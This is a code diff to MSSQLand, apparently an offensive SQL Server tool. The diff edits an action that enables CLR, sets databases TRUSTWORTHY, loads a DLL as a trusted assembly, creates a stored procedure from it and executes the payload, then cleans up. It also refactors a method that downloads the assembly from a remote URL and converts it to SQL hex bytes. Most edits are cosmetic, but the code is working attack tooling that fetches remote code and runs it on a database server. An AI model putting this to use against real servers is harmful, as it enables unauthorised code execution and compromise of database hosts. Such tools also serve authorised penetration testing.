@@ -60,8 +60,8 @@ namespace MSSQLand.Actions.Execution
             databaseContext.ConfigService.SetConfigurationOption("clr enabled", 1);
 
             // Step 3: Generate random names for assembly and trusted hash path.
-            string dllPath = $"dll{Guid.NewGuid().ToString("N").Substring(0, 6)}";
-            string assem = $"assem{Guid.NewGuid().ToString("N").Substring(0, 6)}";
+            string dllPath = Guid.NewGuid().ToString("N").Substring(0, 6);
+            string assem = Guid.NewGuid().ToString("N").Substring(0, 6);
 
             // Step 4: Handle legacy SQL servers.
             if (databaseContext.Server.Legacy)
@@ -128,27 +128,27 @@ namespace MSSQLand.Actions.Execution
 
             if (!databaseContext.ConfigService.CheckAssembly(assem))
             {
-                Logger.Error("Failed to create a new assembly.");
+                Logger.Error("Failed to create a new assembly");
                 databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
                 databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);
                 return;
             }
 
-            Logger.Success($"DLL successfully loaded into assembly '{assem}'.");
+            Logger.Success($"DLL successfully loaded into assembly '{assem}'");
 
             // Step 9: Create a new stored procedure linked to the assembly.
             databaseContext.QueryService.ExecuteNonProcessing($"CREATE PROCEDURE [dbo].[{_function}] AS EXTERNAL NAME [{assem}].[StoredProcedures].[{_function}];");
 
             if (!databaseContext.ConfigService.CheckProcedures(_function))
             {
-                Logger.Error("Failed to load the DLL into a new stored procedure.");
+                Logger.Error("Failed to load the DLL into a new stored procedure");
                 databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
                 databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
                 databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);
                 return;
             }
 
-            Logger.Success($"Stored procedure '{_function}' created successfully.");
+            Logger.Success($"Stored procedure '{_function}' created successfully");
 
             // Step 10: Execute the payload
             Logger.Task("Executing payload");
@@ -166,7 +166,7 @@ namespace MSSQLand.Actions.Execution
                 databaseContext.QueryService.ExecuteNonProcessing($"ALTER DATABASE {databaseContext.Server.Database} SET TRUSTWORTHY OFF;");
             }
 
-            Logger.Success("Execution and cleanup completed.");
+            Logger.Success("Execution and cleanup completed");
         }
 
 
@@ -216,53 +216,60 @@ namespace MSSQLand.Actions.Execution
         }
 
         /// <summary>
-        /// The _convertDLLToSQLByteWeb method will download a .NET assembly from a remote HTTP/s
-        /// location and covert it to SQL compatible byte format for storage in a stored procedure.
+        /// Downloads a .NET assembly from a remote HTTP/S location and converts it
+        /// to SQL-compatible byte format for storage in a stored procedure.
         /// </summary>
-        /// <param name="dll"></param>
-        /// <returns></returns>
+        /// <param name="dll">The URL of the DLL to download.</param>
+        /// <returns>An array containing the SHA-512 hash and SQL-compatible byte string.</returns>
         private static string[] ConvertDLLToSQLBytesWeb(string dll)
         {
-            string[] dllArr = new string[2];
-            string dllHash = "";
-            string dllBytes = "";
-
             try
             {
-                // Get the SHA-512 hash of the DLL, so we can use sp_add_trusted_assembly to add it as a trusted DLL on the SQL server.
-                using SHA512 sha512 = SHA512.Create();
-                using WebClient client = new WebClient();
-                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
+                // Ensure a valid URL is provided
+                if (string.IsNullOrWhiteSpace(dll) || (!dll.StartsWith("http://") && !dll.StartsWith("https://")))
+                {
+                    throw new ArgumentException($"Invalid DLL URL: {dll}");
+                }
+
                 Logger.Info($"Downloading DLL from {dll}");
 
-                byte[] content = client.DownloadData(dll);
+                // Set up secure protocols for downloading the DLL
+                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
 
-                using MemoryStream stream = new MemoryStream(content);
-                BinaryReader reader = new BinaryReader(stream);
-                byte[] dllByteArray = reader.ReadBytes(Convert.ToInt32(stream.Length));
-                stream.Close();
-                reader.Close();
-
-                Logger.Info($"DLL is {dllByteArray.Length} bytes");
-
-                foreach (var hash in sha512.ComputeHash(dllByteArray))
+                // Download the DLL content
+                byte[] dllBytes;
+                using (var client = new WebClient())
                 {
-                    dllHash += hash.ToString("x2");
+                    dllBytes = client.DownloadData(dll);
                 }
-                // Read the local dll as bytes and store into the dllBytes variable, otherwise, the DLL will need to be on the SQL server.
-                foreach (Byte b in dllByteArray)
+
+                Logger.Info($"DLL downloaded successfully, size: {dllBytes.Length} bytes");
+
+                // Compute the SHA-512 hash
+                string dllHash;
+                using (var sha512 = SHA512.Create())
                 {
-                    dllBytes += b.ToString("X2");
+                    dllHash = BitConverter.ToString(sha512.ComputeHash(dllBytes)).Replace("-", "").ToLower();
                 }
+
+                Logger.Info($"SHA-512 hash computed: {dllHash}");
+
+                // Convert the DLL bytes to a SQL-compatible hexadecimal string
+                string dllHexString = BitConverter.ToString(dllBytes).Replace("-", "").ToUpper();
+
+                return new[] { dllHash, dllHexString };
+            }
+            catch (WebException ex)
+            {
+                Logger.Error($"Failed to download DLL from {dll}. Web exception: {ex.Message}");
             }
             catch (Exception ex)
             {
-                Logger.Error($"Unable to download DLL from {ex}");
+                Logger.Error($"An error occurred while processing the DLL: {ex.Message}");
             }
 
-            dllArr[0] = dllHash;
-            dllArr[1] = dllBytes;
-            return dllArr;
+            // Return empty values in case of failure
+            return new[] { string.Empty, string.Empty };
         }
 
         /// <summary>
